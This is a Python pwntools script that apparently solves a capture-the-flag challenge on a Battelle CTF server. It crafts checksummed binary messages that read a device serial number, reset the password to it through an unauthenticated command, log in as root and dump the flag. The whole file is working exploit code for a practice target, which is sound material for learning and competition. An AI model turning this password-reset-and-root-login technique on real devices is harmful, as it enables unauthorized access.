from pwn import *


HEADER = b"\xd0\xd0\x0b\x0e"


def checksum(data: bytes) -> int:
    csum = 0
    for b in data:
        csum ^= b
    return csum & 0xff


def clear_0x1c4() -> bytes:
    message = bytearray()
    message += HEADER
    message += b"\x00\x00"
    message += b"\x92"
    message += bytearray([checksum(message)])
    return message


def read_sno() -> bytes:
    message = bytearray()
    message += HEADER
    message += b"\x00\x00"
    message += b"\xd0"
    message += bytearray([checksum(message)])
    return message


def read_flag() -> bytes:
    message = bytearray()
    message += HEADER
    message += b"\x00\x00"
    message += b"\xbc"
    message += bytearray([checksum(message)])
    return message


def set_sno() -> bytes:
    message = bytearray()
    message += HEADER
    message += b"\x00\x0b"
    message += b"\x72"
    message += bytearray([checksum(message)])
    message += b"8315622905\x00"
    return message


def sendrecv(r, msg):
    r.send(msg)
    response = r.recv(1024)
    log.info(f"RESPONSE: {response.hex()}")
    try:
        log.info(f"ASCII:    {response[8:].decode('utf-8')}")
    except:
        log.info(f"No ASCII to decode")


# ------------------------------------------------------------------------------
# Debug mode for all the bytes
context.log_level = "debug"

# Create connection to remote
r = remote("kir.ctf.battelle.org", 10033)

# Read serial number
sendrecv(r, read_sno())

# Reset password to serial number
sendrecv(r, set_sno())

# Login 
message = bytearray()
message += HEADER
message += b"\x00\x13"
message += b"\x22"
message += bytearray([checksum(message)])
message += b" \x04root0\x0b8315622905\x00"

sendrecv(r, message)

# Dump me flag please
sendrecv(r, read_flag())

r.close()